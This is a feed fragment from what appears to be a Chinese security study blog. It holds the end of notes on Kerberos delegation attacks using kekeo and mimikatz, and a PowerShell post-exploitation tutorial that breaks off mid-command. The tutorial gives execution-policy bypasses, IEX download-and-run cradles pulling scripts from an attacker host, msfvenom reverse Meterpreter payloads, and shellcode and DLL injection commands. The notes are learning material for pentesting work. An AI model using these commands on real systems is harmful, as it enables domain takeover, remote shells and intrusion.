src="20200211172106-d50ce7da-4caf-1.png" alt="img"></p><p>查找域中配置约束委派的主机：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">AdFind.exe</span> -<span class="keyword">b </span><span class="string">"DC=qiyou,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))"</span> <span class="meta">cn</span> distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure><p><img src="20200211172239-0c56c080-4cb0-1.png" alt="img"></p><h6 id="PowerView-1"><a href="#PowerView-1" class="headerlink" title="PowerView"></a>PowerView</h6><p><strong>注</strong>：Powerview有两个版本，一个在dev分支：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">地址</a>，一个在master分支：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" rel="noopener">地址</a></p><p>查找域中配置约束委派用户</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-DomainUser –TrustedToAuth -domain qiyou.com -<span class="keyword">Properties</span> distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl</span><br></pre></td></tr></table></figure><p><img src="20200206170357-9bafde5a-48bf-1.png" alt="img"></p><p>查找域中配置约束委派的主机：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-DomainComputer -TrustedToAuth -Domain qiyou.com -<span class="keyword">Properties</span> distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize</span><br></pre></td></tr></table></figure><p><img src="20200205223329-7a841d9a-4824-1.png" alt="img"></p><h4 id="基于委派的攻击方法"><a href="#基于委派的攻击方法" class="headerlink" title="基于委派的攻击方法"></a>基于委派的攻击方法</h4><h5 id="1-已知被设置非约束性委派属性的服务账号的口令明文，则可以获取域管理权限"><a href="#1-已知被设置非约束性委派属性的服务账号的口令明文，则可以获取域管理权限" class="headerlink" title="1.已知被设置非约束性委派属性的服务账号的口令明文，则可以获取域管理权限"></a>1.已知被设置非约束性委派属性的服务账号的口令明文，则可以获取域管理权限</h5><p><img src="20200505112605.png-water_print" alt="img"></p><p>现在已知域内服务账号 <code>sqlsvc</code> 的口令明文，则可使用 keke 工具构造 sqlsvc 服务账号的票据。</p><p>cmd</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">tgt::<span class="title">ask</span> /<span class="title">user:sqlsvc</span> /<span class="title">domain:testlab</span>.<span class="title">com</span> /<span class="title">passw</span> <span class="title">ord</span>:1<span class="title">qaz</span>@<span class="title">WSX3edc</span> /<span class="title">ticket:sqlsvc</span>.<span class="title">kirbi</span></span></span><br></pre></td></tr></table></figure><p><img src="20200505112611.png-water_print" alt="img"></p><p>由于 <code>sqlsvc</code> 被设置为非约束性委派，因此可以利用刚才伪造的 sqlsvc 票据，向域服务器发起申请访问域服务器 <code>CIFS</code> 服务的管理员权限的 TGS 的命令</p><p>cmd</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Tgs::<span class="title">s4u</span> /<span class="title">tgt:service_account_tgt_file</span> /<span class="title">user:administrator</span>@<span class="title">testlab.com</span> /<span class="title">service:service_to_access</span></span></span><br></pre></td></tr></table></figure><p><img src="20200505113020.png-water_print" alt="img"></p><p>此时内存中已经有了访问域服务器 CIFS 服务的域管理员的 TGS 票据，需要将该票据注入当前的会话中，使用 mimikatz 的 <code>kerberos::ptt</code> 命令可完成票据的注入。注入票据后，当前的会话具备了访问域服务器 C 盘目录的权限</p><p><img src="20200505113149.png-water_print" alt="img"></p><h5 id="2-已控制非约束性委派服务账号所在的服务器"><a href="#2-已控制非约束性委派服务账号所在的服务器" class="headerlink" title="2.已控制非约束性委派服务账号所在的服务器"></a>2.已控制非约束性委派服务账号所在的服务器</h5><p>攻击者控制了服务器，与样例 1 类似。由于攻击者控制了服务器，可直接利用 <code>mimikatz</code> 从内存获取服务账号的 <code>TGT</code>，所以可以省去 <code>tgt::ask</code> 步骤，直接从 <code>tgs:s4u</code> 步骤开始，后续和样例 1 相同</p><h5 id="3-已获取配置了约束性委派的服务账号的口令-NTLM"><a href="#3-已获取配置了约束性委派的服务账号的口令-NTLM" class="headerlink" title="3.已获取配置了约束性委派的服务账号的口令 NTLM"></a>3.已获取配置了约束性委派的服务账号的口令 NTLM</h5><p>和样例 1 相同，样例 1 用明文口令生成 NTLM，然后向域服务器申请获取服务账号的 TGT。Kekeo 提供了该功能 ，可直接从 NTLM 开始，向域服务器申请 TGT。</p><h5 id="4-一个主机账号被设置了约束性委派，已获取该主机账号的口令NTLM"><a href="#4-一个主机账号被设置了约束性委派，已获取该主机账号的口令NTLM" class="headerlink" title="4.一个主机账号被设置了约束性委派，已获取该主机账号的口令NTLM"></a>4.一个主机账号被设置了约束性委派，已获取该主机账号的口令NTLM</h5><p>方法和样例 1 也是类似，只不过样例 1 中是服务账号，而本样例中是主机账号。测试结果截图分别如下，不再过多解释。测试可在任何域内主机中进行，不需要在主机账号所在的主机。</p><p><img src="20200505113609.png-water_print" alt="img"></p><p><img src="20200505113722.png-water_print" alt="img"></p><p><img src="20200505113740.png-water_print" alt="img"></p><h4 id="委派攻击的防御"><a href="#委派攻击的防御" class="headerlink" title="委派攻击的防御"></a>委派攻击的防御</h4><p>通过上文中说到设置了非约束委派的账户权限如果被窃取那么攻击者可能获取非常多其他账户的TGT，所以最好是不要在域中使用非约束委派这种功能。</p><p>域中不需要使用委派的账户特别是administrator账户，设置为“敏感用户不能被委派”。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Kerberos委派攻击学习&quot;&gt;&lt;a href=&quot;#Kerberos委派攻击学习&quot; class=&quot;headerlink&quot; title=&quot;Kerberos委派攻击学习&quot;&gt;&lt;/a&gt;Kerberos委派攻击学习&lt;/h2&gt;&lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot;
      
    
    </summary>
    
    
      <category term="内网与域渗透学习" scheme="https://shu1l.github.io/categories/%E5%86%85%E7%BD%91%E4%B8%8E%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>Powershell渗透学习</title>
    <link href="https://shu1l.github.io/2020/07/21/powershell-shen-tou-xue-xi/"/>
    <id>https://shu1l.github.io/2020/07/21/powershell-shen-tou-xue-xi/</id>
    <published>2020-07-21T09:22:39.000Z</published>
    <updated>2021-01-16T08:33:08.105Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Powershell渗透学习"><a href="#Powershell渗透学习" class="headerlink" title="Powershell渗透学习"></a>Powershell渗透学习</h2><p>[TOC]</p><h3 id="powershell渗透基础"><a href="#powershell渗透基础" class="headerlink" title="powershell渗透基础"></a>powershell渗透基础</h3><h4 id="powershell简介"><a href="#powershell简介" class="headerlink" title="powershell简介"></a>powershell简介</h4><p>​                PowerShell是一种基于任务的命令行解释器和脚本环境，可以说是一种强大的shell,如同linux的bash,专为系统管理员而设计，以.NET框架为平台，Windows PowerShell帮助IT专业人员和超级用户控制和自动化管理Windows操作系统和运行在操作系统上的应用。<strong>现被更广泛用于渗透测试等方面，在不需要写入磁盘的情况下执行命令，也可以逃避Anti-Virus检测。</strong></p><p><strong>注:</strong>powershell只能针对win7以后的系统使用,</p><p><strong>为什么要学powershell</strong></p><p>​        对于我们渗透测试人员来说，PowerShell给我们提供了一个非常强大的shell和脚本环境。现在我们的渗透目标上都已经默认安装了PowerShell（win7以后，PowerShell已经默认集成在操作系统上），这给我们提供了一个强大的后渗透利用工具，给予我们很高的权限和广阔的攻击面。</p><h5 id="powershell的优点"><a href="#powershell的优点" class="headerlink" title="powershell的优点"></a>powershell的优点</h5><ul><li>易学</li><li>基于.NET框架</li><li>操作系统信任</li><li>提供win系列操作系统的几乎一切访问权限</li><li>win7之后默认安装</li><li>面向对象</li><li>ISE编程接口</li></ul><h5 id="常见的Powershell攻击工具"><a href="#常见的Powershell攻击工具" class="headerlink" title="常见的Powershell攻击工具"></a>常见的Powershell攻击工具</h5><ul><li>PowerShell：这是众多PowerShell攻击工具中被广泛使用的PowerShell后期的漏洞利用框架，常用来进行信息探测，特权提升，凭证窃取，持久化等操作。</li><li>Nishang：基于PowerShell的渗透测试专用工具，集成了框架，脚本和各种Payload，包含下载和执行，键盘记录，DNS，延时命令等脚本。</li><li>Empire：基于PowerShell的远程控制木马，可以从凭证数据库中导出和跟踪凭证信息，常用于提供前期漏洞利用的集成模块，信息探测，凭证窃取，持久化控制。</li><li>PowerCat：PowerShell版的NetCat，有着网络工具中的”瑞士军刀”美誉，它能通过TCP和UDP在网络中读取数据。通过与其他工具结合和重定向，读者可以在脚本中以多种方式使用它</li></ul><h4 id="powershell语法基础"><a href="#powershell语法基础" class="headerlink" title="powershell语法基础"></a>powershell语法基础</h4><p>网站学习:<a href="http://www.pstips.net/" target="_blank" rel="noopener">http://www.pstips.net/</a></p><p>推荐文章:<a href="https://www.anquanke.com/post/id/87976" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87976</a> 讲的很细。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">|管道符的作用是将一个命令的输出作为另一个命令的输入</span></span><br><span class="line">;分号用来连续执行系统命令</span><br><span class="line"><span class="meta">&amp;是调用操作符，它允许你执行命令，脚本或函数</span></span><br><span class="line">双引号可以替换内部变量</span><br><span class="line">双引号里的双引号，单引号里的单引号，写两遍输出</span><br></pre></td></tr></table></figure><h5 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h5><p><strong>运输符</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">· &gt;:将输出保存到指定文件中（用法：<span class="built_in">Get-Process</span>&gt;output.txt）</span><br><span class="line"></span><br><span class="line">· &gt;&gt;:将脚本的输出追加到指定文件中（用法：test.ps1&gt;&gt;output.txt）</span><br><span class="line"></span><br><span class="line">· <span class="number">2</span>&gt;:将错误输出到指定文件中（<span class="built_in">Get-Porcess</span> none <span class="number">2</span>&gt;Errors.txt）</span><br><span class="line"></span><br><span class="line">· <span class="number">2</span>&gt;&gt;:将错误追加到指定文件中（<span class="built_in">Get-Process</span> none <span class="number">2</span>&gt; logs<span class="literal">-Errors</span>.txt）</span><br><span class="line"></span><br><span class="line">· <span class="operator">-eq</span>:等于运算符（用法：<span class="variable">$var1</span> –eq <span class="variable">$var2</span>，返回真或假）</span><br><span class="line"></span><br><span class="line">· <span class="operator">-gt</span>:大于运算符（用法：<span class="variable">$var1</span> –gt <span class="variable">$var2</span>，返回真或假）</span><br><span class="line"></span><br><span class="line">· <span class="operator">-match</span>:匹配运算符，搜索字符串是否在文中出现（用法：<span class="variable">$Text</span> –match <span class="variable">$string</span>返回真或假）</span><br><span class="line"></span><br><span class="line">· <span class="operator">-replace</span>:替换字符串（用法：<span class="variable">$Text</span> –replace 被替换的字符,替换的字符，返回真或假）</span><br><span class="line"></span><br><span class="line">· <span class="operator">-in</span>：测试一个字符或数字是否出现在文本中或列表中，声明列表直接使用（）</span><br></pre></td></tr></table></figure><p><strong>数组</strong></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="meta-keyword">$Array</span> = value1, value2, value3</span></span><br></pre></td></tr></table></figure><p><strong>语句</strong></p><ul><li>条件语句</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">If</span><span class="params">(<span class="variable">$var</span> &#123;comparison_statement&#125; <span class="variable">$var2</span>)</span></span> &#123;What_To_Do&#125;</span><br><span class="line">Else &#123;what_to_if_not&#125;</span><br></pre></td></tr></table></figure><ul><li>循环语句</li></ul><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span><span class="comment">()</span> &#123;&#125;</span><br><span class="line"><span class="keyword">Do</span> &#123;&#125; <span class="keyword">While</span><span class="comment">()</span></span><br><span class="line">For<span class="comment">(;;;)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><h5 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">使用powershell满足一个标椎动词-名词组合，来帮助我们更快理解。</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-<span class="keyword">Alias</span> -<span class="type">name</span> dir 查看别名</span><br><span class="line"></span><br><span class="line">    Ls env 查看当前环境变量</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-ExecutionPolicy 查看当前执行策略</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Set</span>-ExecutionPolicy 设置执行的策略</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-Host 查看powershell版本</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-Content 查看文件内容</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-Content test.txt  显示文本内容</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Set</span>-Content test.txt-<span class="keyword">Value</span> "hello,word" 设置文本内容</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-Process  查看当前服务列表</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-<span class="keyword">Location</span> 获取当前位置</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-WmiObject -<span class="keyword">Class</span> Win32_ComputerSystem |<span class="keyword">Select</span>-<span class="keyword">object</span> -ExpandProperty UserName 查看登录到物理机的用户</span><br></pre></td></tr></table></figure><h4 id="cmdlets说明"><a href="#cmdlets说明" class="headerlink" title="cmdlets说明"></a>cmdlets说明</h4><p><strong>Cmdlets</strong>是PowerShell的非常重要的内部命令集。</p><p><strong>Cmdlet</strong>是以.NET类实例形式存在的命令。</p><p>它并不是简单的可执行文件，它有很多属性，这些属性用来指定输入参数或者使用管道来管理重定向。</p><p>Cmdlets可以用任何.NET语言来编写，也可以用PowerShell脚本语言来编写。我们可以通过输入“Get-Command”可以显示可用的Cmdlets命令。</p><p>输入“Get-Command”，这将返回所有可用的命令</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200720143951.png" alt=""></p><h5 id="渗透中常用的cmdlets命令"><a href="#渗透中常用的cmdlets命令" class="headerlink" title="渗透中常用的cmdlets命令"></a>渗透中常用的cmdlets命令</h5><p>查看start-process的帮助文档，</p><p><code>Get-Help Start-Process</code>，</p><p>如图：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200720144622.png" alt=""></p><p>我们也可以使用Get-Process命令来获取指定的进程。这个命令在后渗透中也很有用而且经常用到，可以用来获取进程的ID，比如获取资源管理器的ID，如图：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200720144954.png" alt=""></p><p><strong>常用的cmdlets的命令</strong></p><ul><li>Copy a file: Copy-Item source_file destination_file</li><li>Move a file: Move-Item source_file destination_file</li><li>Get Services: Get-Service</li><li>Formatting output: Get-Process l Format-List –property name</li><li>Get hash (SHA1) of a file: Get-FileHash –Algorithm SHA1 file</li><li>Get-Content</li><li>Get-Location</li><li>start-process </li></ul><h4 id="powershell执行策略"><a href="#powershell执行策略" class="headerlink" title="powershell执行策略"></a>powershell执行策略</h4><table><thead><tr><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>Restricted</td><td>受限制的，可以执行单个的命令，但是不能执行脚本Windows 8, Windows Server 2012, and Windows 8.1中默认就是这种策略，所以是不能执行脚本的，执行就会报错，那么如何才能执行呢？Set-ExecutionPolicy -ExecutionPolicy Bypass就是设置策略为Bypass这样就可以执行脚本了。</td></tr><tr><td>AllSigned</td><td>AllSigned 执行策略允许执行所有具有数字签名的脚本</td></tr><tr><td>RemoteSigned</td><td>当执行从网络上下载的脚本时，需要脚本具有数字签名，否则不会运行这个脚本。如果是在本地创建的脚本则可以直接执行，不要求脚本具有数字签名。</td></tr><tr><td>Unrestricted</td><td>这是一种比较宽容的策略，允许运行未签名的脚本。对于从网络上下载的脚本，在运行前会进行安全性提示。需要你确认是否执行脚本</td></tr><tr><td>Bypass</td><td>Bypass 执行策略对脚本的执行不设任何的限制，任何脚本都可以执行，并且不会有安全性提示。</td></tr><tr><td>Undefined</td><td>Undefined 表示没有设置脚本策略。当然此时会发生继承或应用默认的脚本策略。</td></tr></tbody></table><h5 id="绕过策略的常见方法"><a href="#绕过策略的常见方法" class="headerlink" title="绕过策略的常见方法"></a>绕过策略的常见方法</h5><ul><li>本地读取然后通过管道符运行</li></ul><p><code>powershell get-content test.ps1 | powershell -noprofile -</code></p><ul><li>远程下载并通过IEX运行脚本</li></ul><p><code>powershell -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://xxx.xxx.xxx/a.ps1&#39;)&quot;</code></p><ul><li>Bypass执行策略绕过</li></ul><p><code>powershell -executionpolicy bypass -File ./a.ps1</code></p><ul><li>Unrestricted执行策略标志</li></ul><p><code>powershell -executionpolicy unrestricted -File ./a.ps1</code></p><p>当运行一个从网上下载的未签名的脚本时，会给出权限提示</p><p><strong>注:</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression（IEX的别名）：用来把字符串当作命令执行。</span><br><span class="line"></span><br><span class="line">WindowStyle Hidden（-w Hidden）：隐藏窗口</span><br><span class="line"></span><br><span class="line">Nonlnteractive（-NonI）：非交互模式，PowerShell不为用户提供交互的提示。</span><br><span class="line"></span><br><span class="line"><span class="keyword">NoProfile（-NoP）：PowerShell控制台不加载当前用户的配置文件。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">Noexit（-Noe）：执行后不退出Shell。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">EncodedCommand（-enc）: </span>接受<span class="keyword">base64 </span>encode的字符串编码，避免一些解析问题</span><br></pre></td></tr></table></figure><h3 id="powershell渗透测试框架Powersploit"><a href="#powershell渗透测试框架Powersploit" class="headerlink" title="powershell渗透测试框架Powersploit"></a>powershell渗透测试框架Powersploit</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>PowerShell是一款基于PowerShell的后渗透(Post-Exploitation)框架软件</p><p>其github地址为 <a href="https://github.com/mattifestation/PowerSploit.git" target="_blank" rel="noopener">https://github.com/mattifestation/PowerSploit.git</a></p><h4 id="各模块功能"><a href="#各模块功能" class="headerlink" title="各模块功能"></a>各模块功能</h4><h5 id="一、代码执行（CodeExecution）"><a href="#一、代码执行（CodeExecution）" class="headerlink" title="一、代码执行（CodeExecution）"></a>一、代码执行（CodeExecution）</h5><ul><li>Invoke-DllInjection </li><li>Invoke-ReflectivePElnjection</li><li>Invoke-Shellcode</li><li>Invoke-WmiCommand</li></ul><h5 id="二、脚本修改（ScriptModification）"><a href="#二、脚本修改（ScriptModification）" class="headerlink" title="二、脚本修改（ScriptModification）"></a>二、脚本修改（ScriptModification）</h5><ul><li>Out-EncodedCommand</li><li>Out-CompressedDll</li><li>Out-EncryptedScript</li><li>Remove-Comments</li></ul><h5 id="三、权限维持（Persistence）"><a href="#三、权限维持（Persistence）" class="headerlink" title="三、权限维持（Persistence）"></a>三、权限维持（Persistence）</h5><ul><li>New-UserPersistenceOption</li><li>New-ElevatedPersistenceOption</li><li>Add-Persistence</li><li>Install-SSP</li><li>Get-SecurityPackages</li></ul><h5 id="四、绕过杀毒软件（AntivirusBypass）"><a href="#四、绕过杀毒软件（AntivirusBypass）" class="headerlink" title="四、绕过杀毒软件（AntivirusBypass）"></a>四、绕过杀毒软件（AntivirusBypass）</h5><p>Find-AVSignature</p><h5 id="五、信息收集（Exfiltration）"><a href="#五、信息收集（Exfiltration）" class="headerlink" title="五、信息收集（Exfiltration）"></a>五、信息收集（Exfiltration）</h5><p>这个文件夹主要是收集目标主机上的信息。</p><h5 id="六、信息侦察（Recon）"><a href="#六、信息侦察（Recon）" class="headerlink" title="六、信息侦察（Recon）"></a>六、信息侦察（Recon）</h5><p>这个文件夹主要是以目标主机为跳板进行内网主机侦察。</p><h4 id="搭建PowerSploit脚本服务器"><a href="#搭建PowerSploit脚本服务器" class="headerlink" title="搭建PowerSploit脚本服务器"></a>搭建PowerSploit脚本服务器</h4><p>1.下载PowerSploit到服务器</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span>  <span class="title">https</span>://github.com/mattifestation/PowerSploit.git</span><br></pre></td></tr></table></figure><p>2.启动Apache</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 <span class="literal">start</span></span><br></pre></td></tr></table></figure><p>3.本地查看是否成功搭建</p><h4 id="Invoke-Shellcode"><a href="#Invoke-Shellcode" class="headerlink" title="Invoke-Shellcode"></a>Invoke-Shellcode</h4><p>​    CodeExecution模块下的Invoke-Shellcode脚本常用于将Shellcode插入指定的进程ID或本地PowerShell中，下面介绍两种常用的反弹Meterpreter Shell方法。</p><h5 id="1-直接执行shellcode反弹Meterpreter-Shell"><a href="#1-直接执行shellcode反弹Meterpreter-Shell" class="headerlink" title="1.直接执行shellcode反弹Meterpreter Shell"></a>1.直接执行shellcode反弹Meterpreter Shell</h5><p>在MSF里使用reverse_https模块进行监听</p><p>使用msfvenom命令生成一个powershell脚本木马</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_https LHOST=<span class="number">192.168</span><span class="number">.157</span><span class="number">.139</span> LPORT=<span class="number">4444</span> -f powershell -o test</span><br></pre></td></tr></table></figure><p>接着在目标机Powershell下输入以下命令下载该脚本</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="keyword">zn</span>&gt; IEX (<span class="keyword">New</span>-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.157.139/PowerSploit/CodeExecution/Invoke-Shellcode.ps1"</span>)</span><br></pre></td></tr></table></figure><p>接着输入以下命令下载木马</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">IEX</span> (New-Object Net.WebClient)<span class="selector-class">.DownloadString</span>(<span class="string">"http://192.168.139/test"</span>)</span><br></pre></td></tr></table></figure><p>接着在powershell下运行如下命令</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\zn&gt; Invoke-<span class="keyword">Shellcode </span>-<span class="keyword">Shellcode </span>($<span class="keyword">buf) </span>-Force</span><br></pre></td></tr></table></figure><p>其中的-Force意思是不用提示，直接执行。</p><p>​    按理说，此步骤执行完成后，返回MSF的监听界面下，会发现已经反弹成功了，可是我的Powershell在运行完Invoke-Shellcode -Shellcode ($buf) -Force命令后直接提示“Windows PowerShell已停止工作”，然后就崩溃了，导致不能反弹成功，不知道为啥。</p><h5 id="2-指定进程注入shellcode反弹Meterpreter-Shell"><a href="#2-指定进程注入shellcode反弹Meterpreter-Shell" class="headerlink" title="2.指定进程注入shellcode反弹Meterpreter Shell"></a>2.指定进程注入shellcode反弹Meterpreter Shell</h5><p>同样先在目标机Powershell下输入命令下载脚本和木马</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="keyword">zn</span>&gt; IEX (<span class="keyword">New</span>-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.157.139/PowerSploit/CodeExecution/Invoke-Shellcode.ps1"</span>)</span><br><span class="line">PS C:\Users\<span class="keyword">zn</span>&gt; IEX (<span class="keyword">New</span>-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.157.139/test"</span>)</span><br></pre></td></tr></table></figure><p>接着输入Get-Process命令或者ps命令查看当前进程</p><p>然后输入以下命令创建一个新的进程，并把它设置为隐藏的，再输入Get-Process命令查看进程，可以看到多了一个id为2668，名为notepad的进程</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">PS </span>C:\<span class="string">Users\</span><span class="string">zn&gt;</span> <span class="string">start-process </span>C:\<span class="string">Windows\</span><span class="string">System32\</span><span class="string">notepad.</span><span class="string">exe </span>-<span class="string">WindowStyle </span><span class="string">Hidden</span></span><br><span class="line"><span class="string">PS </span>C:\<span class="string">Users\</span><span class="string">zn&gt;</span> <span class="built_in">get-process</span> <span class="string">notepad</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Handles </span> <span class="string">NPM(</span>K)    <span class="string">PM(</span>K)      <span class="string">WS(</span>K) <span class="string">VM(</span>M)   <span class="string">CPU(</span>s)     <span class="string">Id </span><span class="string">ProcessName</span></span><br><span class="line"><span class="string">-</span>------  ------    -----      ----- -----   ------     -- -----------</span><br><span class="line">     <span class="string">56 </span>      7     <span class="string">1424 </span>      <span class="string">5384 </span>   <span class="string">75 </span>    0.<span class="string">02 </span>  <span class="string">2668 </span><span class="string">notepad</span></span><br></pre></td></tr></table></figure><p>接着输入以下命令，使用Invoke-Shellcode脚本进行进程注入</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\zn&gt; Invoke-<span class="keyword">Shellcode </span>-ProcessID <span class="number">2668</span> -<span class="keyword">Shellcode </span>($<span class="keyword">buf) </span>-Force</span><br><span class="line">记事本已停止工作</span><br></pre></td></tr></table></figure><p>同样的，按理说，此步骤执行完成后，返回MSF的监听界面下，会发现已经反弹成功了，可是我的Powershell在运行完Invoke-Shellcode -Shellcode ($buf) -Force命令后直接提示“Windows PowerShell已停止工作”，然后就崩溃了，导致不能反弹成功。</p><h4 id="Invoke-DllInjection"><a href="#Invoke-DllInjection" class="headerlink" title="Invoke-DllInjection"></a>Invoke-DllInjection</h4><p>下面使用CodeExecution模块下的另一个脚本Invoke-DllInjection，它是一个DLL注入的脚本。</p><p>同理还是首先在MSF里配置好监听，与上面的相同。</p><p>然后使用以下命令在kali中生成一个dll的反弹木马</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# msfvenom -p windows/meterpreter/reverse_https LHOST=<span class="number">192.168</span><span class="number">.157</span><span class="number">.139</span> LPORT=<span class="number">4444</span> -f dll -o /var/www/html/test.dll</span><br></pre></td></tr></table></figure><p>将test.dll下载到目标机</p><p>然后在目标机上下载脚本，输入以下命令</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="keyword">zn</span>&gt; IEX (<span class="keyword">New</span>-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.157.139/PowerSploit/CodeExecution/Invoke-DllInjection.ps1"</span>)</span><br></pre></td></tr></table></figure><p>接着启动一个新进程，使用Invoke-Shellcode脚本进行进程注入</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:<span class="symbol">\U</span>sers<span class="symbol">\z</span>n&gt; start-process C:<span class="symbol">\W</span>indows<span class="symbol">\S</span>ystem32<span class="symbol">\n</span>otepad.exe -WindowStyle Hidden</span><br><span class="line">PS C:<span class="symbol">\U</span>sers<span class="symbol">\z</span>n&gt; 